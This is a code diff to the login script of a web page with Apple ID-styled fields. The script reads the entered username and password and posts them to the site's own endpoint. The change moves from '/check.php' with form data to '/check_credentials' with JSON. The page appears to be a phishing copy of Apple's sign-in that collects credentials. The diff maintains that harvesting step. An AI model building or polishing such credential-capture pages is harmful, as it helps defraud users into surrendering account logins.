@@ -63,16 +63,16 @@
         });
 
         function CheckCreds() {
-            var login = document.getElementsByName('login')[0].value
+            var username = document.getElementsByName('login')[0].value
             var password = document.getElementsByName('password')[0].value
 
-            if (login == "" || password == "") {
+            if (username == "" || password == "") {
                 if (password == "") {
                     $('#apple-id-pass').focus();
                     $('#apple-id-pass').attr("placeholder", "Required");
                     $('#apple-id-pass').attr("empty", "true");
                 }
-                if (login == "") {
+                if (username == "") {
                     $('#apple-id-login').focus();
                     $('#apple-id-login').attr("placeholder", "Required");
                     $('#apple-id-pass').attr("empty", "true");
@@ -81,9 +81,8 @@
             else {
                 StartWait();
                 var result = "";
-
                 var xhr = new XMLHttpRequest();
-                var body = 'login=' + login + '&password=' + password;
+                var data = {"username": username, "password": password};
 
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState == XMLHttpRequest.DONE) {
@@ -99,10 +98,11 @@
                             Error();
                         }
                     }
-                }            
-                xhr.open("POST", '/check.php', true);
-                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                xhr.send(body);
+                }
+
+                xhr.open("POST", '/check_credentials', false);
+                xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+                xhr.send(JSON.stringify(data));
             }
         }
 
